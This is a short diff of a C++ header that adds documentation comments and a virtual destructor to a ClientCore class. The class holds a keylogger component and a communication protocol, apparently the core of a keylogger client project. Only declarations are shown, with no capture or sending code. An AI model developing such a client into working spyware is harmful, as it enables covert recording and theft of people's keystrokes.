@@ -15,18 +15,27 @@
 #include	<iostream>
 #include	<memory>
 
+/// \namespace spider
 namespace spider
 {
-  class ClientCore
+    /// \class ClientCore
+    class ClientCore
   {
   protected:
-    std::unique_ptr<IKeyLogger>	_keylogger;
-    std::unique_ptr<IProtocol>	_proto;
+        /// \brief Keylogger
+        std::unique_ptr<IKeyLogger>	_keylogger;
+
+        /// \ brief communication protocol class
+        std::unique_ptr<IProtocol>	_proto;
 
   public:
-    ClientCore();
-    ~ClientCore();
+        /// \brief default constructor
+        ClientCore();
 
-    void run();
+        /// \brief default destructor
+        virtual ~ClientCore();
+
+        /// \brief run the client
+        void run();
   };
 }
